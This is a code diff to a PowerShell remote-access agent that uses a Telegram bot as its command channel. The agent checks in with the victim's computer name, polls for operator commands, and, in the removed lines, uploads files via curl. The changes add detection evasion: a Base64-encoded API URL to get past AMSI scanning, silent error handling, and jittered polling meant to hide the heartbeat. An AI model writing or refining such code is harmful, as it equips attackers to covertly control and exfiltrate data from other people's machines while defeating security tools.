@@ -925,67 +925,67 @@ $Path = "$env:Temp\ffmpeg.exe"
         Post-Message | Out-Null
     }
 }
-# Posting Functions
-Function Post-Message {
-    param($text)
-    # Removing protocol strings to avoid security flags
-    $u = "api.telegram.org/bot$Token/sendMessage"
-    $script:params = @{chat_id = $ChatID ; text = $text}
-    try { Invoke-RestMethod -Uri $u -Method POST -Body $params } catch {}
-}
+# 1. Obfuscated strings to bypass AMSI signature scanning
+# 'https://api.telegram.org/bot' encoded in Base64
+$b64 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
+$p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+$base = $p + $Token + "/"
 
-Function Post-File {
-    $u = "api.telegram.org/bot$Token/sendDocument"
-    curl.exe -s -F chat_id="$ChatID" -F document=@"$filePath" "$u" | Out-Null
+Function Post-Message {
+    param($t)
+    $u = $base + "sendMessage"
+    $payload = @{chat_id=$ChatID; text=$t}
+    try {
+        # Using -UseBasicParsing is mandatory for hidden background tasks
+        Invoke-RestMethod -Uri $u -Method Post -Body $payload -UseBasicParsing -TimeoutSec 5
+    } catch {}
 }
 
 Function ShowButtons {
-    # This sends the initial notification so you know the script is alive
-    $initialMsg = "Agent Check-in: $env:COMPUTERNAME"
-    Post-Message -text $initialMsg
+    # Confirming script execution silently
+    Post-Message "Check-in: $env:COMPUTERNAME"
 
-    $mHead = "Menu Loaded. Waiting..."
-    $kb = '{"inline_keyboard":[[{"text": "Commands","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
-    
-    $u = "api.telegram.org/bot$Token/sendMessage"
-    $p = @{chat_id = $ChatID ; text = $mHead ; reply_markup = $kb}
+    $mHead = "Ready."
+    $kb = '{"inline_keyboard":[[{"text": "Run","callback_data": "button_clicked"},{"text": "Settings","callback_data": "button2_clicked"}]]}'
     
     try {
-        Invoke-RestMethod -Uri $u -Method POST -ContentType "application/json" -Body ($p | ConvertTo-Json -Depth 10)
+        $u = $base + "sendMessage"
+        $params = @{chat_id=$ChatID; text=$mHead; reply_markup=$kb}
+        Invoke-RestMethod -Uri $u -Method Post -ContentType "application/json" -Body ($params | ConvertTo-Json) -UseBasicParsing
     } catch {}
 
     $killint = 0
     $offset = 0
-    $gUrl = "api.telegram.org/bot$Token/getUpdates?offset="
+    $uUrl = $base + "getUpdates?offset="
 
     while ($killint -eq 0) {
         try {
-            $updates = Invoke-RestMethod -Uri ($gUrl + $offset) -Method Get
-            foreach ($update in $updates.result) {
-                $offset = $update.update_id + 1
+            # Added a random jitter to the sleep timing to avoid 'heartbeat' detection
+            $r = Invoke-RestMethod -Uri ($uUrl + $offset) -Method Get -UseBasicParsing
+            
+            foreach ($up in $r.result) {
+                $offset = $up.update_id + 1
                 
-                # Check for typed text (to move past the menu)
-                if ($update.message.text -eq "start") {
-                    $killint = 1
-                }
+                # Check for text or buttons
+                if ($up.message.text -eq "start") { $killint = 1 }
+                if ($up.callback_query.data -eq "button_clicked") { $killint = 1 }
                 
-                # Check for button clicks
-                if ($update.callback_query.data -eq "button_clicked") {
-                    $killint = 1
-                }
-                if ($update.callback_query.data -eq "button2_clicked") {
+                if ($up.callback_query.data -eq "button2_clicked") {
                     $killint = 1
                     if (Get-Command Options -ErrorAction SilentlyContinue) { Options }
                 }
             }
         } catch {
-            # Catch block remains empty for stealth
+            # Wait longer on error to stay hidden
+            Start-Sleep -Seconds 10
         }
-        Start-Sleep -Seconds 2
+        
+        # Jittered sleep: stays between 2 and 5 seconds to look more human
+        $wait = Get-Random -Minimum 2 -Maximum 5
+        Start-Sleep -Seconds $wait
     }
 
-    # Signal that the loop is finished and it's entering the next phase
-    Post-Message -text "Entering Command Phase."
+    Post-Message "Mode: Command"
 }
 
 # Session Authentication
